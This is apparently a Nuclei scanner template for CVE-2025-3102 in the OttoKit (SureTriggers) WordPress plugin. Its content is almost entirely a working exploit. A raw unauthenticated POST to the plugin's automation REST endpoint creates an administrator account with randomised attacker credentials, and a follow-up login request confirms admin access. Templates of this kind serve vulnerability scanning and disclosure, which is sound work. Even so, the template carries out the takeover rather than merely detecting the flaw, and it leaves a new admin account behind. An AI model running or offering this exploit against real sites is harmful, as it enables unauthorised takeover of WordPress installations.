id: cve-2025-3102-login-verify

info:
  name: OttoKit (SureTriggers) â‰¤ 1.0.78 - Unauthenticated Admin Account Creation (Login Verified)
  author: tuankien03
  severity: critical
  description: |
    OttoKit (SureTriggers) plugin <= 1.0.78 suffers from an authentication bypass that allows unauthenticated attackers to create an admin account via a vulnerable REST endpoint. This template attempts the exploit and then verifies success via login.
  tags: cve,cve2025,wordpress,suretriggers,otto,auth-bypass,rce,login,verified
  reference:
    - https://www.wordfence.com/blog/2025/04/critical-vulnerability-in-suretriggers-plugin-cve-2025-3102
  metadata:
    verified: true
    max-request: 2

variables:
  username: "attacker_{{randstr}}"
  password: "attacker_{{randstr}}"
  email: "tuankien+{{randstr}}@example.com"
  role: "administrator"

http:
  - raw:
      - |
        POST {{BaseURL}}/wp-json/sure-triggers/v1/automation/action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "integration": "WordPress",
          "type_event": "create_user_if_not_exists",
          "selected_options": {
            "user_email": "{{email}}",
            "user_name": "{{username}}",
            "password": "{{password}}",
            "role": "{{role}}"
          },
          "fields": [],
          "context": {}
        }
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
        internal: true
      - type: status
        status:
          - 200
        internal: true
      
    extractors:
      - type: regex
        part: body
        name: user_id
        regex:
          - '"user_id":\s*\d+'

  - raw:
      - |
        POST {{BaseURL}}/wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/wp-login.php
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to={{BaseURL}}/wp-admin/&testcookie=1
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: regex
        part: header
        regex:
          - "Location:\\s*.*?/wp-admin/"

